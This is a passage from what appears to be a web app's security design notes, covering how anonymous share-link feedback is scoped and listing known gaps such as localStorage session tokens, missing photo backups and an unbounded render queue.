stronger reason: these people never agreed to anything, they were sent a link. The response
to an anonymous caller is likewise built field by field and carries no `userId`, `projectId`
or `shareId`.

**A full link gets a calm coded refusal, not a 500.** A seller hitting a ceiling they cannot
see must not be shown a crash.

**`GET /api/share/:token/feedback` is scoped to the share, never the listing** — otherwise
whoever holds today's rotated link reads what the previous holder wrote.

**Still true:** this adds no new secret and no new key transport. `public/projects.html`
remains `noindex` + `Disallow`ed with its gated state as the CSS default, so a stalled
entitlement check reveals nothing.

## Known gaps / follow-ups

- **Single instance only** — the flat-file/SQLite-single-writer design corrupts under
  horizontal scaling (see the storage doc). This is an availability *and* integrity
  constraint.
- **`chat-upload` accepts any file type** (size-capped only).
- **No at-rest encryption** for the `/data` files beyond the host disk. This matters more
  now that `projects/` holds customers' own property photographs, not just text — the
  Listing Studio raised the value of that disk without changing its protection.
- **Nothing backs up `projects/`.** Litestream replicates the SQLite file only, so a lost
  disk loses every uploaded photo and render while the rows describing them survive — the
  worst of both states. Object storage is the fix and the adapter boundary is already in
  place (`storage_key` is relative and backend-agnostic); it has not been done.
- **Listing render throughput is one at a time, and unbounded per account.** The worker
  leases a single render per instance, so any Stagify+ user can enqueue a 90-render listing
  and occupy the queue for everyone. `genLimiter` caps request *rate*, not queued work.
  There is no per-account concurrency cap or queue-depth limit yet; this is a fairness and
  cost-exposure gap rather than a data one.
- **Session token lives in `localStorage`, not an `httpOnly` cookie** — so an XSS is
  account takeover, and `connectSrc`/`imgSrc: 'https:'` won't stop exfiltration. The
  fix, its true scope, and the CSRF surface it opens are written up under
  [Tokens in the browser](#tokens-in-the-browser-localstorage-not-a-cookie--accepted-risk).
  Deliberately deferred: it is a project, not a patch.
- **Erasure is operator-mediated** — `POST /api/admin/delete-user` exists, but there is
  no self-serve "delete my account" button in the product. Adding one is a product
  decision (confirmation flow, Stripe cancellation, copy in 11 languages), not a data-
  layer one.
- **Erasure does not reach backups.** Litestream replicates `auth-store.db` to R2, so a
  restored snapshot brings an erased account back. Retention there is a separate policy.
